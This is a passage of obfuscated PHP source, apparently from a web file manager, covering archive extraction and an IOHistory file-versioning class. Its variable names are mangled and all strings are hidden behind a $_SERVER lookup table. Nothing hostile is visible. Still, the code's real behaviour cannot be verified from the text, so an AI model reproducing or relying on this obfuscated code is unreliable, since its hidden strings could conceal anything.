IO::mkdir($Á·±ÀÛ . $´Àò—Íä); } $ŠÖæ÷†í = $ŠÖæ÷†í && $ŠÖæ÷†í != $½Öò¦[1242] ? @json_decode($ŠÖæ÷†í, !0) : -1; $Ìï¬…Š = self::unzipPart($ªºŒë›‘, $ŠÖæ÷†í); if (!$Ìï¬…Š || !IO::exist($Ìï¬…Š[$½Öò¦[231]])) { show_json(LNG($½Öò¦[118]), !1); } $¸òÜÔË = $Ìï¬…Š[$½Öò¦[1243]][count($Ìï¬…Š[$½Öò¦[1243]]) - 1]; if ($¸òÜÔË[$½Öò¦[1244]] == -1 || substr($¸òÜÔË[$½Öò¦[42]], -1, 1) == $½Öò¦[18]) { $÷Ï«ò» = $Ìï¬…Š[$½Öò¦[1245]] . rand_string(10) . $½Öò¦[18]; mk_dir($÷Ï«ò»); $‡ÃøµØ = count($Ìï¬…Š[$½Öò¦[1243]]) == 1 ? IO::ext($ªºŒë›‘) : get_path_ext($Ìï¬…Š[$½Öò¦[231]]); $ş…ÛØ÷ = KodArchive::extract(self::iconvSystem($Ìï¬…Š[$½Öò¦[231]]), $÷Ï«ò», $¸òÜÔË[$½Öò¦[1244]], $´Àò—Íä, $‡ÃøµØ); self::unzipErrorCheck($ş…ÛØ÷, array($½Öò¦[1246], $ªºŒë›‘, $‡ÃøµØ, $ ä¨Ü©ë, $Ìï¬…Š)); Hook::trigger($½Öò¦[1247], $÷Ï«ò»); recursion_dir($÷Ï«ò», $”Ø˜—»™, $œûËÕ, 0); $àäá…Ø = array_merge($”Ø˜—»™, $œûËÕ); $·¨şâˆ¿ = array(); foreach ($àäá…Ø as $÷Ëë¡Ùº) { $é¤ªÓ ‹ = IO::move(self::iconvApp($÷Ëë¡Ùº), $ ä¨Ü©ë, $º÷‡ÄÎŞ); if ($é¤ªÓ ‹) { $·¨şâˆ¿[] = $é¤ªÓ ‹; } } del_dir($÷Ï«ò»); } else { $é¤ªÓ ‹ = IO::move($Ìï¬…Š[$½Öò¦[231]], $ ä¨Ü©ë, $º÷‡ÄÎŞ, get_path_this($¸òÜÔË[$½Öò¦[42]])); if ($é¤ªÓ ‹) { $·¨şâˆ¿[] = $é¤ªÓ ‹; } } return $·¨şâˆ¿ ? $·¨şâˆ¿ : !1; } public static function unzipList($º¿Ô²Éö) { $š˜¿½İ• =& $_SERVER[Õò”†—·]; $´¬®½„Î = isset($º¿Ô²Éö[$š˜¿½İ•[1248]]) ? $º¿Ô²Éö[$š˜¿½İ•[1248]] : !1; $¢‚ÙÏŞ = isset($º¿Ô²Éö[$š˜¿½İ•[1244]]) ? @json_decode($º¿Ô²Éö[$š˜¿½İ•[1244]], !0) : -1; $šÄ½‘å­ = self::unzipPart($º¿Ô²Éö[$š˜¿½İ•[97]], $¢‚ÙÏŞ); if (!$šÄ½‘å­ || !IO::exist($šÄ½‘å­[$š˜¿½İ•[231]])) { show_json(LNG($š˜¿½İ•[118]), !1); } $‚ĞÓŞµ˜ = $šÄ½‘å­[$š˜¿½İ•[1243]][count($šÄ½‘å­[$š˜¿½İ•[1243]]) - 1]; $†ªßôİ… = in_array(IO::ext($šÄ½‘å­[$š˜¿½İ•[231]]), array($š˜¿½İ•[373], $š˜¿½İ•[1249], $š˜¿½İ•[1250], $š˜¿½İ•[1251], $š˜¿½İ•[1252], $š˜¿½İ•[1253])); if (!$´¬®½„Î && ($‚ĞÓŞµ˜[$š˜¿½İ•[1244]] == -1 || $†ªßôİ…)) { $±áï‡¶‚ = $šÄ½‘å­[$š˜¿½İ•[1245]] . get_path_this($šÄ½‘å­[$š˜¿½İ•[231]]) . $š˜¿½İ•[1254]; if (!IO::exist($±áï‡¶‚)) { $°×ŒÚ‚® = $‚ĞÓŞµ˜[$š˜¿½İ•[1244]] == -1 ? get_path_ext(IO::pathThis($º¿Ô²Éö[$š˜¿½İ•[97]])) : get_path_ext($šÄ½‘å­[$š˜¿½İ•[231]]); $²‰­´ÉÅ = KodArchive::listContent(self::iconvSystem($šÄ½‘å­[$š˜¿½İ•[231]]), !0, $°×ŒÚ‚®); self::unzipErrorCheck($²‰­´ÉÅ, array($š˜¿½İ•[1255], $º¿Ô²Éö, $šÄ½‘å­)); @file_put_contents($±áï‡¶‚, json_encode($²‰­´ÉÅ[$š˜¿½İ•[1256]])); } return @json_decode(IO::getContent($±áï‡¶‚), !0); } IO::fileOut($šÄ½‘å­[$š˜¿½İ•[231]], $´¬®½„Î, get_path_this($‚ĞÓŞµ˜[$š˜¿½İ•[42]])); die; } private static function zipFileList($Ä±ÈõÒ, $ï¤ ƒŠÙ = false) { $óÚ±¢‘á =& $_SERVER[Õò”†—·]; $–Íî«Ğê = array(); foreach ($Ä±ÈõÒ as $æ‰Àõ­Ï) { $¢÷éõ÷Ã = $æ‰Àõ­Ï[$óÚ±¢‘á[97]]; if ($ï¤ ƒŠÙ) { $¢÷éõ÷Ã = self::copy($æ‰Àõ­Ï[$óÚ±¢‘á[97]], $ï¤ ƒŠÙ, $óÚ±¢‘á[868]); } else { $®×’¯âÎ = self::init($æ‰Àõ­Ï[$óÚ±¢‘á[97]]); if ($®×’¯âÎ->getType() == $óÚ±¢‘á[119]) { $¢÷éõ÷Ã = $®×’¯âÎ->path; } } if ($¢÷éõ÷Ã && self::local()->exist($¢÷éõ÷Ã)) { $–Íî«Ğê[$æ‰Àõ­Ï[$óÚ±¢‘á[97]]] = $¢÷éõ÷Ã; } } if (!empty($–Íî«Ğê)) { return array_values($–Íî«Ğê); } show_json(LNG($óÚ±¢‘á[1218]), !1); } private static function localFilePath($×ø¤ŸÂÈ) { $ÔÏ…Ø°Ë =& $_SERVER[Õò”†—·]; $öúŒ×™Ã = KodIO::parse($×ø¤ŸÂÈ); if ($öúŒ×™Ã[$ÔÏ…Ø°Ë[43]] == KodIO::KOD_SOURCE) { $Ó„§Ëºá = Model($ÔÏ…Ø°Ë[875])->fileInfoGet(KodIO::sourceID($×ø¤ŸÂÈ)); if (!$Ó„§Ëºá[$ÔÏ…Ø°Ë[97]]) { show_json($ÔÏ…Ø°Ë[1257], !1); } $×ø¤ŸÂÈ = $Ó„§Ëºá[$ÔÏ…Ø°Ë[97]]; } $Ÿ¦èØ¡· = self::init($×ø¤ŸÂÈ); if ($Ÿ¦èØ¡·->pathParse[$ÔÏ…Ø°Ë[1204]]) { $×ø¤ŸÂÈ = $Ÿ¦èØ¡·->pathParse[$ÔÏ…Ø°Ë[1204]]; $Ÿ¦èØ¡· = self::init($×ø¤ŸÂÈ); } $Í˜™Õ¾ = $Ÿ¦èØ¡·->getType(); if ($Í˜™Õ¾ == $ÔÏ…Ø°Ë[119] || $Í˜™Õ¾ == $ÔÏ…Ø°Ë[1258]) { if (!$Ÿ¦èØ¡·->exist($Ÿ¦èØ¡·->path)) { show_json(LNG($ÔÏ…Ø°Ë[118]), !1); } return $Ÿ¦èØ¡·->path; } return !1; } public static function unzipPart($¹Ê·ËçĞ, $º—Ùšîì = -1) { $¿è…®†† =& $_SERVER[Õò”†—·]; $Ğßàãâ = IO::pathThis($¹Ê·ËçĞ); if (!$º—Ùšîì || $º—Ùšîì == -1) { $Ö©ô‚õÈ = array(array($¿è…®††[42] => $Ğßàãâ, $¿è…®††[1244] => -1)); $Ö©ô‚õÈ[0][$¿è…®††[1259]] = $Ö©ô‚õÈ[0][$¿è…®††[42]]; } else { if (is_array($º—Ùšîì)) { $Ö©ô‚õÈ = $º—Ùšîì; $’Éî¨¦¾ = count($Ö©ô‚õÈ) - 1; for ($‘·šºûø = 0; $‘·šºûø <= $’Éî¨¦¾; $‘·šºûø++) { $µôÛÏ÷µ = $Ö©ô‚õÈ[$‘·šºûø]; $áğÍ»È÷ = get_path_this($µôÛÏ÷µ[$¿è…®††[42]]) . (checkExtSafe($µôÛÏ÷µ[$¿è…®††[42]]) ? $¿è…®††[22] : $¿è…®††[1260]); $Ö©ô‚õÈ[$‘·šºûø][$¿è…®††[1259]] = $¿è…®††[1261] . intval($µôÛÏ÷µ[$¿è…®††[1244]]) . $¿è…®††[446] . $áğÍ»È÷; if ($‘·šºûø == 0) { continue; } $Ö©ô‚õÈ[$‘·šºûø][$¿è…®††[1259]] = $Ö©ô‚õÈ[$‘·šºûø - 1][$¿è…®††[1259]] . $¿è…®††[1262] . $Ö©ô‚õÈ[$‘·šºûø][$¿è…®††[1259]]; } } } if (!is_array($Ö©ô‚õÈ) || count($Ö©ô‚õÈ) == 0) { return !1; } $…‘½û×Ò = $Ö©ô‚õÈ[count($Ö©ô‚õÈ) - 1]; if (!IO::exist($¹Ê·ËçĞ)) { return !1; } $É”¹‰šš = TEMP_FILES . $¿è…®††[1263] . kodIO::hashPathSafe($¹Ê·ËçĞ) . $¿è…®††[18]; $îÔ§‹éä = $É”¹‰šš . $…‘½û×Ò[$¿è…®††[1259]]; mk_dir($É”¹‰šš); file_put_contents(TEMP_FILES . $¿è…®††[1238], $¿è…®††[22]); if (IO::exist($îÔ§‹éä)) { return array($¿è…®††[231] => $îÔ§‹éä, $¿è…®††[1243] => $Ö©ô‚õÈ, $¿è…®††[1245] => $É”¹‰šš); } $ÚÎå¢  = self::localFilePath($¹Ê·ËçĞ); if (!$ÚÎå¢ ) { $ÚÎå¢  = $É”¹‰šš . $¿è…®††[1264]; if (!IO::exist($ÚÎå¢ )) { self::copy($¹Ê·ËçĞ, $É”¹‰šš, !1, get_path_this($ÚÎå¢ )); } } if (!$ÚÎå¢  || !IO::exist($ÚÎå¢ )) { return !1; } if ($…‘½û×Ò[$¿è…®††[1244]] == -1) { return array($¿è…®††[231] => $ÚÎå¢ , $¿è…®††[1243] => $Ö©ô‚õÈ, $¿è…®††[1245] => $É”¹‰šš); } $¢Òš¿¾Ú = $ÚÎå¢ ; foreach ($Ö©ô‚õÈ as $‘·šºûø => $µôÛÏ÷µ) { if (!$µôÛÏ÷µ || $µôÛÏ÷µ[$¿è…®††[1244]] == $¿è…®††[1242]) { break; } if (substr($µôÛÏ÷µ[$¿è…®††[42]], -1, 1) == $¿è…®††[18]) { break; } $¦¶–õñå = in_array(get_path_ext($µôÛÏ÷µ[$¿è…®††[1259]]), array($¿è…®††[373], $¿è…®††[1249], $¿è…®††[1250], $¿è…®††[1251], $¿è…®††[1252], $¿è…®††[1253])); $ÉÜÑõ›Ë = $‘·šºûø == count($Ö©ô‚õÈ) - 1 && $¦¶–õñå; $ø“ÍÀĞé = $É”¹‰šš . $µôÛÏ÷µ[$¿è…®††[1259]]; $¦Á´ƒò = $É”¹‰šš . get_path_this($µôÛÏ÷µ[$¿è…®††[42]]); if (IO::exist($ø“ÍÀĞé)) { $¢Òš¿¾Ú = $ø“ÍÀĞé; continue; } $™½›àóÜ = $‘·šºûø == 0 ? get_path_ext($Ğßàãâ) : get_path_ext($¢Òš¿¾Ú); $‹É«ß­ä = KodArchive::extract(self::iconvSystem($¢Òš¿¾Ú), $É”¹‰šš, $µôÛÏ÷µ[$¿è…®††[1244]], $±ÓÉò¿±, $™½›àóÜ); self::unzipErrorCheck($‹É«ß­ä, array($¿è…®††[1265], $¹Ê·ËçĞ, $Ö©ô‚õÈ, $µôÛÏ÷µ, $ø“ÍÀĞé)); if (IO::exist($¦Á´ƒò)) { IO::rename($¦Á´ƒò, get_path_this($ø“ÍÀĞé)); } $¢Òš¿¾Ú = $ø“ÍÀĞé; } $îÔ§‹éä = $¢Òš¿¾Ú; return array($¿è…®††[231] => $¢Òš¿¾Ú, $¿è…®††[1243] => $Ö©ô‚õÈ, $¿è…®††[1245] => $É”¹‰šš); } private static function unzipErrorCheck($ö ò´Ë, $İ²½š¡ß = false) { $©Ÿ†¨úÙ =& $_SERVER[Õò”†—·]; if ($ö ò´Ë[$©Ÿ†¨úÙ[1266]]) { return !0; } write_log(array($©Ÿ†¨úÙ[1267], $ö ò´Ë, $İ²½š¡ß), $©Ÿ†¨úÙ[1268]); show_json($©Ÿ†¨úÙ[1269] . json_encode($ö ò´Ë[$©Ÿ†¨úÙ[1256]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $Ûã×ÜÃ =& $_SERVER[Õò”†—·]; $ĞŠÏºØÇ = $GLOBALS[$Ûã×ÜÃ[16]][$Ûã×ÜÃ[102]]; if ($ĞŠÏºØÇ[$Ûã×ÜÃ[1270]] != 1) { return; } if ($ĞŠÏºØÇ[$Ûã×ÜÃ[1271]] <= 0) { return; } if (isset($_REQUEST[$Ûã×ÜÃ[1272]]) && $_REQUEST[$Ûã×ÜÃ[1272]] == $Ûã×ÜÃ[101]) { return; } Hook::bind($Ûã×ÜÃ[1273], $Ûã×ÜÃ[1274]); Hook::bind($Ûã×ÜÃ[1275], $Ûã×ÜÃ[1276]); Hook::bind($Ûã×ÜÃ[1277], $Ûã×ÜÃ[1278]); Hook::bind($Ûã×ÜÃ[1279], $Ûã×ÜÃ[1280]); Hook::bind($Ûã×ÜÃ[1281], $Ûã×ÜÃ[1282]); Hook::bind($Ûã×ÜÃ[1283], $Ûã×ÜÃ[1284]); } public static function eventBeforeUpload($ğŸ£‹‹Å) { if ($ğŸ£‹‹Å[3] && $ğŸ£‹‹Å[3] != REPEAT_REPLACE) { return; } $¦ßÎ˜—ò = self::parsePath($ğŸ£‹‹Å[0]); if (!$¦ßÎ˜—ò) { return; } self::add($¦ßÎ˜—ò); } public static function eventBeforeEdit($¡õÂÕáà) { $¶é«¨øË = self::parsePath($¡õÂÕáà[0]); if (!$¶é«¨øË) { return; } self::add($¶é«¨øË); } public static function eventBeforeCopyFile($µÊ¾Š«á, $¬ŸìÛ™Ğ, $òÏÔ¤ÀÆ, $¸£Œ˜òĞ, $ÎÁÌŠÁ, $ÌÄÉåÏô) { $×Ó’¾Á› =& $_SERVER[Õò”†—·]; if (isset($òÏÔ¤ÀÆ->_data[$×Ó’¾Á›[1208]]) && $òÏÔ¤ÀÆ->_data[$×Ó’¾Á›[1208]]) { return; } $µÛ²î†¬ = $òÏÔ¤ÀÆ->getPathOuter($¸£Œ˜òĞ); $åäöÒ = self::parsePath($µÛ²î†¬); if (!$åäöÒ) { return; } self::add($åäöÒ); } public static function eventBeforeRename($³Ë†ÏİË) { $øŞËÛÅô =& $_SERVER[Õò”†—·]; $åÇ‹¿ü² = self::parsePath($³Ë†ÏİË[0]); if (!$åÇ‹¿ü²) { return; } $Ó¿ûê€¡ = self::checkInHistory($åÇ‹¿ü²); if (!$Ó¿ûê€¡) { return; } if ($Ó¿ûê€¡[$øŞËÛÅô[43]] == $øŞËÛÅô[231]) { $£†Èé¿Õ = self::listData($åÇ‹¿ü²); if ($£†Èé¿Õ && $£†Èé¿Õ[$øŞËÛÅô[429]]) { self::moveHistory($åÇ‹¿ü², $³Ë†ÏİË[1]); } } else { IO::rename($Ó¿ûê€¡[$øŞËÛÅô[97]], $³Ë†ÏİË[1]); } } public static function eventBeforeMove($êµ±ÊÕ‹) { $áÆì±ù— =& $_SERVER[Õò”†—·]; $ÅÛœÃ¼€ = self::parsePath($êµ±ÊÕ‹[0]); if (!$ÅÛœÃ¼€) { return; } $úßÊÊøó = self::parsePath($êµ±ÊÕ‹[1]); if (!$úßÊÊøó) { return; } $ê„©¥ê« = $êµ±ÊÕ‹[3]; $Ô™…£Ûï = self::checkInHistory($ÅÛœÃ¼€); if (!$Ô™…£Ûï) { return; } $œ¶ˆ†°ş = self::pathHistory($úßÊÊøó); if ($Ô™…£Ûï[$áÆì±ù—[43]] == $áÆì±ù—[231]) { $óõÆäóÕ = self::listData($ÅÛœÃ¼€); $“ºİÚ„³ = rtrim($úßÊÊøó, $áÆì±ù—[18]) . $áÆì±ù—[18] . ($ê„©¥ê« ? $ê„©¥ê« : get_path_this($ÅÛœÃ¼€)); $Ë€Ø€ã€ = self::listData($“ºİÚ„³); if ($óõÆäóÕ && $óõÆäóÕ[$áÆì±ù—[429]] && $Ë€Ø€ã€ && $Ë€Ø€ã€[$áÆì±ù—[429]]) { return self::clear($ÅÛœÃ¼€); } if ($óõÆäóÕ && $óõÆäóÕ[$áÆì±ù—[429]]) { self::moveHistory($ÅÛœÃ¼€, $ê„©¥ê«, $œ¶ˆ†°ş); } } else { IO::move($Ô™…£Ûï[$áÆì±ù—[97]], $œ¶ˆ†°ş, !1, $ê„©¥ê«); self::clearEmptyFolder(IO::pathFather($Ô™…£Ûï[$áÆì±ù—[97]])); } } public static function eventAfterRemove($„¦¯É¬, $Ñ“åë¼) { $â´Î»Îé =& $_SERVER[Õò”†—·]; if (!$Ñ“åë¼) { return; } $×Ş¬˜ÌÔ = self::parsePath($„¦¯É¬[0]); if (!$×Ş¬˜ÌÔ) { return; } $óúİ•„Õ = self::checkInHistory($×Ş¬˜ÌÔ); if (!$óúİ•„Õ) { return; } if ($óúİ•„Õ[$â´Î»Îé[43]] == $â´Î»Îé[231]) { $³ÄÕÊÅ = self::listData($×Ş¬˜ÌÔ, !1); if ($³ÄÕÊÅ && $³ÄÕÊÅ[$â´Î»Îé[429]]) { self::clear($×Ş¬˜ÌÔ, !1); } } else { IO::remove($óúİ•„Õ[$â´Î»Îé[97]]); self::clearEmptyFolder(IO::pathFather($óúİ•„Õ[$â´Î»Îé[97]])); } } private static function checkInHistory($”Ãò˜µÜ) { $ıôÔÃö¹ = self::pathHistory($”Ãò˜µÜ); if (!IO::exist($ıôÔÃö¹)) { $ıôÔÃö¹ .= $_SERVER[Õò”†—·][1285]; } return IO::exist($ıôÔÃö¹) ? IO::info($ıôÔÃö¹) : !1; } private static function parsePath($ÑÓ÷ä) { $†ÃÂ‹è’ =& $_SERVER[Õò”†—·]; if (!$ÑÓ÷ä) { return !1; } if (isset($GLOBALS[$†ÃÂ‹è’[1286]]) && $GLOBALS[$†ÃÂ‹è’[1286]]) { return; } $æë´ÛúÜ = KodIO::parse($ÑÓ÷ä); $ÏÂÎıüÙ = $æë´ÛúÜ[$†ÃÂ‹è’[43]]; $ƒÖ‚­…ü = !$ÏÂÎıüÙ || $ÏÂÎıüÙ == KodIO::KOD_IO || $ÏÂÎıüÙ == KodIO::KOD_SHARE_ITEM; if (!$ƒÖ‚­…ü || !$æë´ÛúÜ[$†ÃÂ‹è’[1287]]) { return !1; } if (substr($ÑÓ÷ä, 0, strlen(DATA_PATH . $†ÃÂ‹è’[1288])) == DATA_PATH . $†ÃÂ‹è’[1288]) { return !1; } if ($ÏÂÎıüÙ == KodIO::KOD_SHARE_ITEM) { $…˜»á£· = IO::init($ÑÓ÷ä); if ($…˜»á£·->pathParse[$†ÃÂ‹è’[1204]]) { return self::parsePath($…˜»á£·->pathParse[$†ÃÂ‹è’[1204]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $ê…şì = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $†ÃÂ‹è’[1289]); foreach ($ê…şì as $æ»ÆĞ‡‡) { if (!$ÏÂÎıüÙ && substr($ÑÓ÷ä, 0, strlen($æ»ÆĞ‡‡)) == $æ»ÆĞ‡‡) { return !1; } } self::log($GLOBALS[$†ÃÂ‹è’[1199]] . $†ÃÂ‹è’[1290] . $ÑÓ÷ä); return $ÑÓ÷ä; } private static function pathHistory($Ñ¦÷—û) { $™èÊ£Çè =& $_SERVER[Õò”†—·]; $Œ©»à¯” = self::$_historyBase . ltrim(KodIO::clear($Ñ¦÷—û), $™èÊ£Çè[18]); $Œ©»à¯” = str_replace(array($™èÊ£Çè[1291]), array($™èÊ£Çè[1292]), $Œ©»à¯”); return $Œ©»à¯”; } public static function log($èÅ·­Ì) { } public static function historyCount($áÁ¡Ğœ) { $™ó¢œ€Û =& $_SERVER[Õò”†—·]; $çĞ½ÖÅğ = array(); $˜Âˆ¿Óâ = array(); foreach ($áÁ¡Ğœ as $²Ú‹») { $Âæ˜è²’ = get_path_father($²Ú‹»); if (!$˜Âˆ¿Óâ[$Âæ˜è²’]) { $˜Âˆ¿Óâ[$Âæ˜è²’] = array(); } $˜Âˆ¿Óâ[$Âæ˜è²’][] = get_path_this($²Ú‹»); } foreach ($˜Âˆ¿Óâ as $Âæ˜è²’ => $‘–šÊÅ×) { $ÃûÑŠ° = self::parsePath($Âæ˜è²’); if (!$ÃûÑŠ°) { continue; } foreach ($‘–šÊÅ× as $Èí÷º) { $ÁêÕ¡£ = self::listData(rtrim($ÃûÑŠ°, $™ó¢œ€Û[18]) . $™ó¢œ€Û[18] . $Èí÷º, !1); if ($ÁêÕ¡£ && $ÁêÕ¡£[$™ó¢œ€Û[429]]) { $çĞ½ÖÅğ[rtrim($Âæ˜è²’, $™ó¢œ€Û[18]) . $™ó¢œ€Û[18] . $Èí÷º] = count($ÁêÕ¡£[$™ó¢œ€Û[429]]); } } } return $çĞ½ÖÅğ; } public static function add($“õëã¢å) { $¶Ì”Â”Ï =& $_SERVER[Õò”†—·]; $­§³ûªƒ = self::listData($“õëã¢å); if (!$­§³ûªƒ) { return; } $•ºöÛÙı = Model($¶Ì”Â”Ï[821])->get($¶Ì”Â”Ï[1293]); $Ñé†œ = intval($GLOBALS[$¶Ì”Â”Ï[16]][$¶Ì”Â”Ï[102]][$¶Ì”Â”Ï[1271]]); $ÎõÁıŞŠ = $•ºöÛÙı == $¶Ì”Â”Ï[1294] ? min(5, $Ñé†œ) : $Ñé†œ; if ($Ñé†œ <= 0) { return; } $µõŸ¥‘Ö = IO::info($“õëã¢å); $ëÚï‡´· = $­§³ûªƒ[$¶Ì”Â”Ï[429]]; if ($µõŸ¥‘Ö[$¶Ì”Â”Ï[89]] == 0) { return; } if ($µõŸ¥‘Ö[$¶Ì”Â”Ï[89]] >= 1024 * 1024 * 500) { return !1; } $±¦Ÿ—ÒÀ = IO::hashSimple($“õëã¢å); if ($ëÚï‡´· && $ëÚï‡´·[0][$¶Ì”Â”Ï[656]] == $±¦Ÿ—ÒÀ) { return !0; } if (array_key_exists($¶Ì”Â”Ï[234], $µõŸ¥‘Ö) && !$µõŸ¥‘Ö[$¶Ì”Â”Ï[234]]) { return !1; } $Â¢²²«í = short_id(time()); $à¦´åèÙ = array($¶Ì”Â”Ï[459] => $Â¢²²«í, $¶Ì”Â”Ï[656] => $±¦Ÿ—ÒÀ, $¶Ì”Â”Ï[42] => $µõŸ¥‘Ö[$¶Ì”Â”Ï[42]] . $¶Ì”Â”Ï[20] . date($¶Ì”Â”Ï[1295]) . rand_string(1), $¶Ì”Â”Ï[89] => $µõŸ¥‘Ö[$¶Ì”Â”Ï[89]], $¶Ì”Â”Ï[511] => USER_ID, $¶Ì”Â”Ï[232] => time(), $¶Ì”Â”Ï[1296] => $¶Ì”Â”Ï[22]); IO::mkdir($­§³ûªƒ[$¶Ì”Â”Ï[1297]]); $êğ¥ùäí = IO::copy($“õëã¢å, $­§³ûªƒ[$¶Ì”Â”Ï[1297]], !1, $à¦´åèÙ[$¶Ì”Â”Ï[42]]); if (!$êğ¥ùäí) { self::clearEmptyFolder($­§³ûªƒ[$¶Ì”Â”Ï[1297]]); return !1; } array_unshift($ëÚï‡´·, $à¦´åèÙ); if (count($ëÚï‡´·) > $ÎõÁıŞŠ) { $İÇú×Æú = array_slice($ëÚï‡´·, $ÎõÁıŞŠ); foreach ($İÇú×Æú as $²¯Œ§ ) { IO::remove($­§³ûªƒ[$¶Ì”Â”Ï[1297]] . $²¯Œ§ [$¶Ì”Â”Ï[42]]); } $ëÚï‡´· = array_slice($ëÚï‡´·, 0, $ÎõÁıŞŠ); } return self::saveData($­§³ûªƒ[$¶Ì”Â”Ï[1298]], $ëÚï‡´·); } public static function remove($ª™£¤Æ¬, $¼ƒ¼àí£) { $ûàÆ¡… =& $_SERVER[Õò”†—·]; $Ó¿‚§ã­ = self::listData($ª™£¤Æ¬); $Ê¹à²óÆ = array(); if (!$Ó¿‚§ã­) { return !1; } foreach ($Ó¿‚§ã­[$ûàÆ¡…[429]] as $Ş‰…ØŞ) { if ($Ş‰…ØŞ[$ûàÆ¡…[459]] == $¼ƒ¼àí£) { IO::remove($Ó¿‚§ã­[$ûàÆ¡…[1297]] . $Ş‰…ØŞ[$ûàÆ¡…[42]]); continue; } $Ê¹à²óÆ[] = $Ş‰…ØŞ; } return self::saveData($Ó¿‚§ã­[$ûàÆ¡…[1298]], $Ê¹à²óÆ); } public static function clear($–¹Ùñ”, $óšø²º¦ = true) { $±øˆèÎ½ =& $_SERVER[Õò”†—·]; $œãŠ“€ = self::listData($–¹Ùñ”, $óšø²º¦); if (!$œãŠ“€) { return !1; } foreach ($œãŠ“€[$±øˆèÎ½[429]] as $ãŞÆĞ‚) { IO::remove($œãŠ“€[$±øˆèÎ½[1297]] . $ãŞÆĞ‚[$±øˆèÎ½[42]]); } return self::saveData($œãŠ“€[$±øˆèÎ½[1298]], array()); } public static function moveHistory($äŒğŠ¶á, $¸ŞÓá¸ƒ = '', $™áÑàç = '') { $ÁÚèë“ =& $_SERVER[Õò”†—·]; $àĞîÂ‘¿ = self::listData($äŒğŠ¶á, !1); if (!$àĞîÂ‘¿ || !$àĞîÂ‘¿[$ÁÚèë“[429]]) { return !1; } $²ÀåøôÇ = $ÁÚèë“[1285]; $¸ŞÓá¸ƒ = $¸ŞÓá¸ƒ ? $¸ŞÓá¸ƒ : get_path_this($äŒğŠ¶á); $™áÑàç = $™áÑàç ? $™áÑàç : $àĞîÂ‘¿[$ÁÚèë“[1297]]; $œ–˜¶ƒ— = substr(get_path_this($àĞîÂ‘¿[$ÁÚèë“[1298]]), 0, -strlen($²ÀåøôÇ)); foreach ($àĞîÂ‘¿[$ÁÚèë“[429]] as $ÚµÔù– => $è¸¤ÜÖà) { $ÃÄÈ¥¤Î = $¸ŞÓá¸ƒ . substr($è¸¤ÜÖà[$ÁÚèë“[42]], strlen($œ–˜¶ƒ—)); $­½ùĞ¸à = IO::move($àĞîÂ‘¿[$ÁÚèë“[1297]] . $è¸¤ÜÖà[$ÁÚèë“[42]], $™áÑàç, !1, $ÃÄÈ¥¤Î); if ($­½ùĞ¸à) { $àĞîÂ‘¿[$ÁÚèë“[429]][$ÚµÔù–][$ÁÚèë“[42]] = $ÃÄÈ¥¤Î; } } $àĞîÂ‘¿[$ÁÚèë“[1298]] = IO::move($àĞîÂ‘¿[$ÁÚèë“[1298]], $™áÑàç, !1, $¸ŞÓá¸ƒ . $²ÀåøôÇ); self::saveData($àĞîÂ‘¿[$ÁÚèë“[1298]], $àĞîÂ‘¿[$ÁÚèë“[429]]); self::clearEmptyFolder($àĞîÂ‘¿[$ÁÚèë“[1297]]); } public static function rollback($‹ÈÁìÒ, $Ë ¦¢Õµ) { $´¼½Œ³ =& $_SERVER[Õò”†—·]; $ªÅÃ¶¨ç = self::listData($‹ÈÁìÒ); if (!$ªÅÃ¶¨ç) { return; } $º™¨Òšë = IO::info($‹ÈÁìÒ); foreach ($ªÅÃ¶¨ç[$´¼½Œ³[429]] as $µ¿›ò„­ => $Ï’Ô«¡Ë) { if ($Ï’Ô«¡Ë[$´¼½Œ³[459]] == $Ë ¦¢Õµ) { self::add($‹ÈÁìÒ); $»×ï¤…  = $ªÅÃ¶¨ç[$´¼½Œ³[1297]] . $Ï’Ô«¡Ë[$´¼½Œ³[42]]; $ËÁ¨‹ş = IO::copy($»×ï¤… , IO::pathFather($‹ÈÁìÒ), REPEAT_REPLACE, $º™¨Òšë[$´¼½Œ³[42]]); if ($ËÁ¨‹ş) { self::remove($‹ÈÁìÒ, $Ë ¦¢Õµ); } return $ËÁ¨‹ş; } } return !1; } public static function setDetail($…›‚æıÏ, $¢Œ÷§Ó…, $¢ëÔŒÀŠ) { $Ëè»†‹á =& $_SERVER[Õò”†—·]; $íÈ±ÛÑå = self::listData($…›‚æıÏ); if (!$íÈ±ÛÑå) { return; } foreach ($íÈ±ÛÑå[$Ëè»†‹á[429]] as $ıø¢­ => $Îíó›˜µ) { if ($Îíó›˜µ[$Ëè»†‹á[459]] == $¢Œ÷§Ó…) { $íÈ±ÛÑå[$Ëè»†‹á[429]][$ıø¢­][$Ëè»†‹á[1296]] = $¢ëÔŒÀŠ; self::saveData($íÈ±ÛÑå[$Ëè»†‹á[1298]], $íÈ±ÛÑå[$Ëè»†‹á[429]]); return !0; } } return !1; } public static function fileInfo($ç¡…ØÌ, $ÄÎùµç¬) { $œÄ¨¯ø™ =& $_SERVER[Õò”†—·]; $Õ¿¾é = self::listData($ç¡…ØÌ); if (!$Õ¿¾é) { show_json(LNG($œÄ¨¯ø™[118]), !1); } $¿Ášó‚ê = $œÄ¨¯ø™[22]; foreach ($Õ¿¾é[$œÄ¨¯ø™[429]] as $ç©»ÂÀ· => $Îû¶Í ú) { if ($Îû¶Í ú[$œÄ¨¯ø™[459]] != $ÄÎùµç¬) { continue; } $¿Ášó‚ê = $Õ¿¾é[$œÄ¨¯ø™[1297]] . $Îû¶Í ú[$œÄ¨¯ø™[42]]; break; } if (!$¿Ášó‚ê) { show_json(LNG($œÄ¨¯ø™[118]), !1); } return IO::info($¿Ášó‚ê); } public static function fileOut($ÍŸ‘é¿š, $şĞœôÏÁ, $©Š¼ã = false) { $êˆ¦¦‰ =& $_SERVER[Õò”†—·]; $ñ’˜…† = self::fileInfo($ÍŸ‘é¿š, $şĞœôÏÁ); $±ÚÍÊ¡î =& $GLOBALS[$êˆ¦¦‰[17]]; $©Š¼ã = isset($±ÚÍÊ¡î[$êˆ¦¦‰[1248]]) && $±ÚÍÊ¡î[$êˆ¦¦‰[1248]] == 1; if (isset($±ÚÍÊ¡î[$êˆ¦¦‰[43]]) && $±ÚÍÊ¡î[$êˆ¦¦‰[43]] == $êˆ¦¦‰[1299]) { return IO::fileOutImage($ñ’˜…†[$êˆ¦¦‰[97]], $±ÚÍÊ¡î[$êˆ¦¦‰[1300]]); } IO::fileOut($ñ’˜…†[$êˆ¦¦‰[97]], $©Š¼ã, 